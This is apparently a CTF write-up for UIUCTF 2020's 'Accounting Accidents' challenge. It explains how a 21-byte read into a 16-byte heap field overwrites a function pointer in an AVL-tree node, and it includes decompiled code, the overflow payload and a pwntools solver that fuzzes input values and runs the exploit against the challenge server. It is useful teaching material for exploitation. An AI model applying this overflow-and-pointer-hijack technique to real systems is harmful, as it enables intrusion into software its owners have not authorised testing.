# Accounting Accidents @ UIUCTF

##### Jul 25, 2020

Here is a writeup for the Accounting Accidents challenge at last weekend's [UIUCTF](https://ctftime/event/1075). This was
an intro level remote rev challenge (=lots of hints) that first asked you to enter a name, and then 4 prices. 
If you answered well, the flag was printed.

***TL;DR:***

- pick name such that characters 17th through 20th correspond to the flag printing routine's address ***0x8048878***

- pick prices such that the node for the item you named moves to the root of the tree that stores the (item,price) entries 


We had the binary (ELF32 file name *accounting*), 
so the general strategy was finding a winning combination locally, then feeding that to the server. 

### Deal with usleep

***Step 1*** is patching *usleep* out, which the challenge used to slow printing down.
You either modify wait times in the binary, or simply override usleep via LD_PRELOAD.
I suggest the latter, so compile

```cpp
// mylib.c
// gcc -shared -m32 -o mylib.so -fPIC mylib.c
#include <stdio.h>
int usleep(unsigned int usec) { return 0; }         // DISABLE
```

and run the challenge through a script *run.scr*:

```bash
#!/bin/bash
LD_PRELOAD=./mylib.so accounting
```

(In case you recognized the tree structure in the challenge, and feel at home with it, 
then neutering usleep was unnecessary. 
You could then forgo Steps 1 and 3 and construct a solution directly - see closing section.)


### Cursory binary analysis

The first of several hints in the problem was the first output line
*"Booting up Fancy Laser Accounting Generator (F.L.A.G.) at 0x8048878"*, 
so the flag printing routine is at 0x8048878.
Indeed, if you look in Ghidra,
there is a function *print_flag()* right at that address:

```cpp
void print_flag(void)

{
  FILE *__stream;
  int iVar1;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts(
        "Couldn\'t open flag file!\nThis means you either succeeded & should run the attack on theserver, \n or forced this method to run :P"
        );
  }
  else {
  ...
```
with not only a tell-all name but even a detailed error message in case your current directory has no *flag.txt* file.
So the question is how to get control flow to *print_flag()*. 

If you check *main()*, you see

```cpp {% raw %}
  ...
  printf("[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {%p}\n",
         print_flag);
  PTR = insert(0,10,"Apples");
  PTR = insert(PTR,0x14,"Fancy Seashells");
  PTR = insert(PTR,0x1e,"Tom Nook Shirts");
  PTR = insert(PTR,0x28,"Airplane Ticket");
  PTR = insert(PTR,0x32,"ATM Repairs");
  PTR2 = insert(PTR,0x19,(char *)0x0);
  putchar(10);
  ITEM_NAMES[0] = "Shrub Trimming";
  ITEM_NAMES[1] = "Raymond Hush $$";
  ITEM_NAMES[2] = "Town Hall Food";
  ITEM_NAMES[3] = "New Wall Art";
  CNT = 0;
  while (CNT < 4) {
    sprintf(local_114,
            "[Isabelle]: Ohmyheck! I dont know how much \"%s\" costs. Can you tell me?\n%s Cost: ",
            ITEM_NAMES[CNT],ITEM_NAMES[CNT]);
    fancy_print(local_114);
    fflush(stdout);
    memset(BUF,0,8);
    read(0,BUF,8);
    price = atoi(BUF);
    PTR2 = insert(PTR2,price,ITEM_NAMES[CNT]);
    putchar(10);
    fancy_print(
               "\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accountingsystem now\n"
               );
    CNT = CNT + 1;
  }
  sprintf(local_114,
          "[Isabelle]: Okay thank you so much! I\'ll run the accounting software at address %p\n",
          *(undefined4 *)(PTR2 + 0x20));
  fancy_print(local_114);
  (**(code **)(PTR2 + 0x20))(PTR2)
  ...
{% endraw %}
```

(I renamed some variables suitably in the snippet above). The general structure is this:

* 5 items get inserted (to somewhere...)
* a 6th item with null-pointer name gets inserted
* 4 prices are read, and items with those prices get inserted
* at the end it jumps to code at offset + 0x20 relative to the pointer returned by the last insert

The reads for item prices are all safe - only up to 8
chars are read, and atoi always returns some integer whatever its input is, so there is not much one can hijack there.
One still wonders where the name is read for that $25 item. And it definitely smells like that we need to control
that last *PTR2* pointer returned.

So look at *insert()*:

```cpp
int * insert(int *node,int cost,char *name)

{
  ...
  if (node == (int *)0x0) {
    node = (int *)newNode(cost,name);
  }
  else {
    ...
        else {
          iVar1 = leftRotate(node[1]);
          node[1] = iVar1;
          node = (int *)rightRotate(node);
        }
      }
    }
    else {
      node = (int *)rightRotate(node);
    }
  }
  return node;
}
```

and find a node allocator call *newNode()* plus a bunch of highly suggestive calls to *leftRotate()*, *righRotate()*, etc which immediately brings [binary 
trees](https://en.wikipedia.org/wiki/Binary_tree) and tree [operations](https://en.wikipedia.org/wiki/Tree_rotation) to 
mind. The name of an item is actually read in *newNode()*, whenever the name supplied is a null-pointer:

```cpp
int * newNode(int cost,char *name)

{
  size_t __n;
  int *NODE;
  int in_GS_OFFSET;
  char local_110 [256];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  NODE = (int *)malloc(0x24);
  *NODE = cost;
  NODE[1] = 0;
  NODE[2] = 0;
  NODE[3] = 1;
  NODE[8] = 0x80487a6;
  if (name == (char *)0x0) {
    sprintf(local_110,
            "[Isabelle]: Oh no! I cant seem to find what this item is, but it cost %d bells, whatis it?\nItem: "
            ,cost);
    fancy_print(local_110);
    fflush(stdout);
    memset(NODE + 4,0,0x10);
    fgets((char *)(NODE + 4),0x15,stdin);
    *(undefined *)((int)NODE + 0x1f) = 0;
    fancy_print("[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!\n");
  }
  ...
```
It allocs 0x24 = 36 bytes (enough to hold 9 four-byte integers). From offset 8\*4 = 0x20 it stores the
default address 0x80487a6 used by *"the accounting software"* called in main (the call we want to hijack),
and we do read up to 0x15 = 21 chars that are then stored from position 4*4 = 0x10.
Notice, 21 is 5 more than 16, so we can in fact overwrite the complete address stored at byte offsets 0x20-0x23(!).

=> ***Step 2***: give an item name of the form (16 non-newline chars) + 0x78 + 0x88 + 0x04 + 0x08.

(The rest of the data are of no interest - if you care, nevertheless, then the 0th int is the price,
ints 1 and 2 are pointers to the left and right leaves, while int 3 is the balance factor of the node.)

### Fuzz the solution

Now we need this doctored node to be returned by the very last *insert()* in *main()*.

It is not that hard to figure out that the challenge used 
[AVL trees](https://en.wikipedia.org/wiki/AVL_tree), and the pointer returned by insert() is the root of the tree 
after insertion (there was the "Accounting Very Large" hint in the
challenge description, or you can just analyze the code). But you did not have to know any of that. All you 
needed was to realize that given your modified node, all control you have left
are these 4 price values you input, and whatever happens depends on the relationship (smaller, equal, greater)
between each price you enter and the prices already in the tree.

So instead of analyzing what you need to
do to get that node to the root of an AVL tree, you can just fuzz the problem.
The tree starts out with 10, 20, 30, 40, 50, 25 already entered, so picking 4 random values in the range [0,60] 
covers all potential cases. So, ***Step 3***: keep fuzzing the local binary until your numbers entered successfully overwrite the 
address in the *"I'll run the accounting software at address 0x80487a6"* sentence printed at the end.
Finally, ***Step 4***: send the item name and the winning numbers to the challenge server.


Here is the full solver in python:

```python
from pwn import *
import random

goal = b"\x78\x88\x04\x08"   #0x8048878


def getR(local):
   if local: return process("run.scr")
   else:     return remote("chal.uiuc.tf", 2001)


def run1(cvals, local, DBG = False):
   r = getR(local)

   in1 = r.recvuntil("Item:")
   if DBG: print(in1)
   r.send(b"a"*16 + goal + b"\n")     # send item name, address overwrite

   for i in range(4):
      in1 = r.recvuntil("Cost:")
      if DBG: print(in1)
      r.send(str(cvals[n]) + "\n")    # send each price

   while True:
      ret = r.recvuntil("\n")
      if DBG: print(ret)
      if b"address" in ret:           # fish out line with 'address'
         return r, ret


def fuzz(local):
   while True:
      cvals = [ randint(0, 60)  for i in range(4)]
      r, in2 = run1(cvals, local)
      r.close()     # explicitly release file descriptors
      if not b"0x80487a6" in in2:   # check whether combo sets root correctly
         return cvals


def solve(cvals, local):
   r, in2 = run1(cvals, local, True)
   while True:
      print( r.recvuntil("\n") )       # print all remaining lines (including flag)


cvals = fuzz(True)    # fuzz solution (local)
print("winning ticket:", cvals)
solve(cvals, False)   # then solve challenge (remote)

#solve([22, 5, 28, 24], False)
#22,  5, 28, 24
#26, 13, 24, 28
#13, 29, 24, 28
#...

#uiuctf{1s@beLl3_do3sNt_r3@l1y_d0_MuCh_!n_aCnH}
``` 

### Direct construction

After items 10, 20, 30, 40, 50, and 25 are inserted,
the AVL tree looks like this:
```
       30
     /    \
   20      40
  /  \       \
10    25      50
```
with 30 at its root (you can follow this step by step with an online
[AVL tree visualizer](https://www.cs.usfca.edu/~galles/visualization/AVLtree.html)).
To bring 25 up we need to unbalance the node 30 by getting the left part of the tree higher by two levels.
So insert 22 (a number between 20 and 25), then 5 (a number less than 20), and then 28 (a number between 25 and 30),
in any order, which leads to
```
         30
       /    \
     20      40
    /  \       \
  10    25      50
  /     /\
 5    22  28
```
Finally, insert 24 (a number between 22 and 25), which leads to rearrangement because the left side is now too high:
```
         30                         25 
       /    \                     /    \
     20      40                 20      30
    /  \       \     ->        /  \    /  \
  10    25      50           10   22  28  40
  /     /\                   /     \       \
 5    22  28                5      24       50   
       \
       24
```

[back](/)
